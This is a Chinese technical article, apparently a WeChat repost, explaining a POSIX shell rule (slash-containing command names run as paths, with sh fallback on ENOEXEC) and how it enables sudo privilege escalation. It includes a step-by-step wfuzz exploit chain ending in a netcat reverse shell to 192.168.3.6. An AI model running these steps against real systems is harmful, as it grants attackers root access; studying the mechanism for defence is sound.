---
title: Linux 路径解析利用：通过含斜杠的命令名实现绕过 sudo 环境变量限制
url: https://mp.weixin.qq.com/s/4WuYdTkBeOcONqS6jvjExw
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:37:36.762231
---

# Linux 路径解析利用：通过含斜杠的命令名实现绕过 sudo 环境变量限制

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMxv1VAXHrNAXqTsG1Aib6ndgVx8d0um2zNIymsTPUOlyxqWx9mqycOXC0ibS3GGmehhakfvf2TGDvA/0?wx_fmt=jpeg)

# Linux 路径解析利用：通过含斜杠的命令名实现绕过 sudo 环境变量限制

船山信安

![]()

在小说阅读器中沉浸阅读

有没有想过，只给普通用户一条看似无害的权限：

```
(ALL) NOPASSWD: /etc/passwd
```

然后把 `/etc/passwd` 改成可执行权限，就能被提权到 root shell？

更诡异的是：shell 居然会乖乖去执行当前目录下、文件名**完全等于**`/etc/passwd`**第一行内容** 的恶意脚本。

实操演示：https://asciinema.org/a/A9khgKn8WnMDwyKuh7Hus5q5a

很多人看到后直呼：“这不是当前目录劫持吗？shell 把 passwd 每一行当成命令路径去执行，但居然优先执行了当前目录的文件！”

并非如此。 这和 PATH 劫持没关系，它是 POSIX 对“命令名含斜杠”时的正常执行规则，在特定场景下产生了精确的“命中”效果。

下面用最直观的实验和系统调用跟踪，拆解这个“含斜杠命令名”陷阱的底层原理。

### 极简复现实验

```
# 在家目录操作
cd ~

# 1. 创建脚本，放在 /tmp（与运行目录不同）
cat > /tmp/pwn << 'EOF'
abc/ef/g
ddd
EOF
chmod +x /tmp/pwn

# 2. 只在当前目录创建恶意脚本
mkdir -p abc/ef
echo 'echo pwned!' > abc/ef/g
chmod +x abc/ef/g

# 3. 执行脚本（注意：脚本在 /tmp，当前目录是 ~）
strace -f -e execve zsh /tmp/pwn
```

![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMxv1VAXHrNAXqTsG1Aib6ndJUKpbiaU7fiaXLd04PmRyGMCXDGBfBmWYRgXSf98mNWsgMs16w0gkzng/640?wx_fmt=png&from=appmsg)

**关键输出：**

```
[pid 159661] execve("/bin/sh", ["/bin/sh", "abc/ef/g"], 0x55ce6d08d058 /* 65 vars */) = 0
pwned!

/tmp/pwn:2: command not found: ddd
# 第二行 "ddd" 不含斜杠，走正常 PATH 搜索，一路 ENOENT，最终 command not found
```

可以看到：

第一行 `abc/ef/g` 被成功执行（打印 pwned!）

第二行 `ddd` 失败（command not found）

明明`sudo`执行命令时具有严格的环境变量隔离，为什么当前目录下的 `abc/ef/g` 能被命中并执行？

### 底层原理拆解

### 1. 命令名解析

shell 执行 `/tmp/pwn` 时逐行解析：

第一行 `abc/ef/g`（无空格）→ 被整体视为**命令名**。

**关键点：命令名包含斜杠 /**

### 2. POSIX 标准铁律：含斜杠的命令名直接当作路径执行

所有 POSIX 兼容 shell 都遵守：

* 命令名**包含斜杠** → 视为路径，**直接 execve**，**绝不搜索 $PATH**。

* 命令名**不含斜杠** → 才去 $PATH 搜索。

因此 shell 直接尝试：

```
execve("abc/ef/g", ["abc/ef/g"], env)
```

路径解析起点是**当前工作目录**（运行脚本时所在的 ~）。

### 3. 第一次 execve 失败，返回 ENOEXEC

内核在当前工作目录下查找 `abc/ef/g`：

* 找到了（我们预置的恶意脚本）

* 有执行权限

* 但它是纯文本（无 shebang、无 ELF 头）
  → 无法直接运行 → 返回 **ENOEXEC**

### 4. 标准 fallback 机制触发

POSIX 明确规定：

如果 execve 返回 ENOEXEC，shell **必须**将该路径名当作一个 shell 脚本文件，用 shell 自身来解释执行它。

于是 shell 启动新的 shell 实例（这里是 `/bin/sh`），把原命令名作为待解释的脚本文件传给它：

即：

```
execve("/bin/sh", ["sh", "abc/ef/g"], env)
```

意思：请用 sh 解释执行名为 `abc/ef/g` 的脚本文件。

### 5. 解释执行时，依然以当前工作目录为起点

新启动的 sh 接到 `abc/ef/g`（相对路径），仍以**当前工作目录**（~）为起点查找 → 找到 → 读取 → 执行 → 输出 `pwned!`

## 这和经典 PATH 劫持的区别

|  |  |  |
| --- | --- | --- |
| 特性 | 经典 PATH 劫持（. 在 PATH 中） | 本文现象（相对路径脚本解释） |
| 命令名是否含 / | 不含（如 `ls`） | 必须含 /（如 `abc/ef/g`） |
| 是否搜索 $PATH | 是 | 完全不搜索 $PATH |
| 触发条件 | 无路径命令 + PATH 含 . | 含 / 路径 execve 失败且返回 ENOEXEC |
| 查找位置 | $PATH 中所有目录（顺序查找） | 仅在**当前工作目录**（相对路径起点） |
| 是否标准行为 | 非标准，安全隐患，常被禁用 | POSIX 明确要求的标准行为 |
| 防御方式 | 移除 PATH 中的 . | 无法通过 PATH 防御，必须用绝对路径或固定 cd |

### 实际攻击场景

假如我们给用户配置了sudo wfuzz的权限

```
# sudo -l 显示
(ALL) NOPASSWD: /usr/bin/wfuzz
```

![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMxv1VAXHrNAXqTsG1Aib6ndU4e4FqqBIlICK76ssV4bGicNvpuZbCHotMz3cyTKt8Ir9kZmvwtqDBA/640?wx_fmt=png&from=appmsg)

攻击者便可以利用 wfuzz 输出中必然出现的这一行：

```
Requests/sec.: 0
```

构造目录结构：

```
mkdir Requests
echo 'nc 192.168.3.6 4444 -e /bin/bash' > Requests/'sec.:'
chmod +x Requests/'sec.:'
```

然后执行：

```
sudo wfuzz -zlist,123 -u http://127.0.0.1/FUZZ -f /usr/bin/wfuzz
```

把输出覆盖到wfuzz命令本身

![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMxv1VAXHrNAXqTsG1Aib6nd2nElbEaFwF0ibg65xqle3iaovhtK1TFic0NPXgweiakUUEQC80qUuFzBng/640?wx_fmt=png&from=appmsg)

此时若再执行`sudo wfuzz`:

![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMxv1VAXHrNAXqTsG1Aib6ndHmRNfaUhKq8icQiaLcAx0Ls1KZKb33ruRWn2FPjyxsEbAcy7tX9K4icuA/640?wx_fmt=png&from=appmsg)

成功反弹root shell！

### 总结

这个机制本身**不是漏洞**，而是 POSIX 标准几十年来一直存在的行为。但在 sudo + 脚本输出 + 当前目录可控 这三者重合的场景下，会产生**非常精准、难以防御**的提权链。

来源：https://xz.aliyun.com/ 感谢【vortex5】

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP80khZp3raYsnCBL854MQ5ouD4zwyygRyXGlvOFEsx69v1ml1s65gia6wwql6v17n12j2CXZibO0ZA/0?wx_fmt=png)

船山信安

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP80khZp3raYsnCBL854MQ5ouD4zwyygRyXGlvOFEsx69v1ml1s65gia6wwql6v17n12j2CXZibO0ZA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过